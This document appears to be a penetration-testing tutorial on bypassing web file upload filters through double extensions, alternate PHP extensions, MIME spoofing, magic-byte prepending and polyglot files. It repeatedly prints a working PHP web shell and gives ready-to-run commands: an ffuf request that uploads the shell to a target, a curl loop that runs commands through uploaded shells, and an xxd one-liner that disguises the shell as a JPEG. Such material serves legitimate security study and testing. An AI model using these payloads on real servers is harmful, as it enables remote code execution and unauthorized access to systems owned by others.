A **file upload attack** involves uploading a malicious file to a server, often to execute arbitrary code or gain unauthorized access.

---

## Double Extension Attack
A **double extension** attack involves uploading a file with two extensions, such as `file.php.jpg`, `file.php5`, or `file.php.png`. The first extension (e.g., `.php`) represents the file type that will be executed by the server, while the second extension (e.g., `.jpg` or `.png`) is typically used to make the file appear as a harmless image, bypassing the filter

#### How to Use Double Extensions in File Upload Attacks
1. **Create the Malicious Script** 
```bash
# PHP Webshell example
<?php system($_GET['cmd']); ?>
```

2. **Rename the File with Double Extensions**
You can rename your  file to include both a dangerous extension and a harmless one. For example, rename `webshell.php` to `webshell.jpg.php`.
3. **Upload the File**
Upload the file to the server using the vulnerable file upload functionality.

4. **Access the File on the Server**
After uploading the file, access it by navigating to its URL. The  code inside the file will be executed by the server.




---


## Changing File Extensions and Renaming Files
- **File Extensions**: Web applications often restrict uploads based on file extensions. For example, they may allow only `.jpg`, `.png`, `.pdf`, or other "safe" file types and block `.php`, `.exe`, or other potentially dangerous types.
- **Renaming Files**: Attackers can exploit this restriction by renaming the malicious file to an allowed extension. For example, an attacker could upload a PHP web shell by changing the extension from `.php` to `.php5`, `.phtml`, `.txt`, or even `.jpg`.

By doing this, the malicious file might bypass the server's validation system, which only checks the extension or MIME type but does not actually inspect the file's contents (or at least not deeply enough).

#### Possible Modifications

| **Original Extension** | **Possible Derived Extensions**       |
| ---------------------- | ------------------------------------- |
| `php`                  | `php5, phtml, php4, php3, php7, phar` |
| `html`                 | `htm, htm5, shtml, xhtml`             |
| `txt`                  | `text, log, conf, markdown`           |
| `jpg`                  | `jpeg, jpe, jfif, bmp, png`           |
| `gif`                  | `png, jpg, jpeg, bmp, tiff`           |
| `pdf`                  | `txt, ps, html, jpg`                  |
| `csv`                  | `xls, xlsx, txt, json`                |
| `py`                   | `py3, pyc, pyo, pyw, py5`             |
| `mp4`                  | `mkv, avi, mov, flv, webm`            |
| `docx`                 | `doc, odt, txt, pdf, html`            |
| `xlsx`                 | `xls, ods, csv, txt, json`            |
| `zip`                  | `tar, gz, tgz, rar, 7z`               |
| `png`                  | `jpg, jpeg, bmp, gif, tiff`           |
| `xml`                  | `xhtml, html, rdf, json`              |
We can also use **ffuf** to test which extensions are accepted by the server:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt:FUZZ -X POST \
-u http://<target>/upload.php \
-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySJ86OHGBIWOifQiC" \
-d $'------WebKitFormBoundarySJ86OHGBIWOifQiC\r
Content-Disposition: form-data; name="uploadFile"; filename="shell.FUZZ"\r
Content-Type: image/png\r
\r
<?php system($_GET["cmd"]); ?>\r
------WebKitFormBoundarySJ86OHGBIWOifQiC--\r' \
-fs 0
```

If too many results appear as valid, besides adjusting filters, save the "valid" extensions and execute a fuzzing attack testing the execution.
```bash
for ext in $(cat valid_ext.txt); do
  curl "http://<target>/uploads/shell.$ext.jpg?cmd=id"
done
```

---


## MIME Type Spoofing
When uploading a file, the request includes the following header:

```html
Content-Type: image/jpeg
```

This value is:
- Set by the browser
- Based on the file extension
- Fully controllable by the attacker

#### Example

- **Legitimate Content-Type**: When uploading an image, the MIME type might be something like `image/jpeg` or `image/png`.
- **Content-Type Spoofing**: An attacker could change the MIME type of a PHP file to `image/jpeg`. This could bypass the file type checks performed by the server if it is only checking the MIME type type for validation, without inspecting the actual file content.


---

## Magic Bytes
**Magic bytes** are unique sequences of bytes at the beginning of a file that indicate its format. In file upload attacks, attackers may use magic bytes to **bypass content validation filters** by making a malicious file appear to be a legitimate one.

|**File Type**|**Magic Bytes (Hex)**|**ASCII Equivalent / Notes**|
|---|---|---|
|**PNG**|`89 50 4E 47 0D 0A 1A 0A`|`.PNG....`|
|**JPG/JPEG**|`FF D8 FF E0` or `FF D8 FF E1`|ÿØÿà or ÿØÿá|
|**GIF87a**|`47 49 46 38 37 61`|`GIF87a`|
|**GIF89a**|`47 49 46 38 39 61`|`GIF89a`|
|**PDF**|`25 50 44 46 2D`|`%PDF-`|
|**ZIP**|`50 4B 03 04`|`PK..`|
|**RAR**|`52 61 72 21 1A 07 00`|`Rar!...`|
|**7z**|`37 7A BC AF 27 1C`|`7z` header|
|**MP3**|`49 44 33` (for ID3)|`ID3`|
|**EXE (Windows)**|`4D 5A`|`MZ`|
|**ELF (Linux)**|`7F 45 4C 46`|`.ELF`|
|**BMP**|`42 4D`|`BM`|
|**TIFF**|`49 49 2A 00` or `4D 4D 00 2A`|`II*.` or `MM.*`|
|**HTML**|(No fixed bytes, varies)|Starts with `<html>` etc.|
|**PHP**|_(None by standard)_|Starts with `<?php` (text)|

These bytes are used by tools and some security filters to verify that the file type matches the claimed extension and MIME type.

#### Bypassing Upload Filters Using Magic Bytes

To insert the Magic Bytes into the upload file is necessary to convert the hexadecimal string into binary:

```php
echo 'FFD8FFDB' | xxd -r -p > exploit.php.jpg && echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg
```

---

## Polyglot Files

A polyglot file is a file that is valid in multiple formats at the same time. This can bypass upload filters that validate extensions, MIME types, or file signatures.

Instead of changing only the extension or magic bytes, the file keeps a valid structure while embedding extra content (for example, metadata).

Example (Image + Extra Content)

Create a polyglot file starting from a valid image:

```bash
cp valid_image.jpg polyglot.jpg
```

Append extra data without breaking the image:

```bash
echo 'test-data' >> polyglot.jpg
```

Embed content into metadata:

```bash
exiftool -Comment='test-data' image.jpg -o polyglot-meta.jpg
```

Verify file integrity and upload the file:

```bash
file polyglot.jpg
exiftool polyglot-meta.jpg
strings polyglot.jpg
```

Why It Works

- The file keeps valid magic bytes
    
- MIME validation still passes
    
- Basic file inspection often accepts it
